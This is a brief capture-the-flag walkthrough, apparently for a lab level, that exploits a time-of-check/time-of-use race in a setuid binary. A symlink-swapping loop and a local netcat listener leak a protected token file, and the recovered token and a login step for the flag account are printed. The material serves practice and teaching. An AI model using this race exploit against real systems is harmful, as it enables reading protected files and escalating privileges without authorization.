# Steps

1) Open 3 shell as user `level10`
2) Create a new file in tmp called `/tmp/test`
3) Run these scripts on them
`netcat -lk 6969`
`while :; do ln -fs /tmp/test /tmp/pipe; ln -fs /home/user/level10/token /tmp/pipe; done`
`while :; do ./level10 /tmp/pipe 127.0.0.1; done`
4) Get the token needed for `flag10` = `woupa2yuojeeaaed06riuj63c`
5) Log in as `flag10` and run `getflag`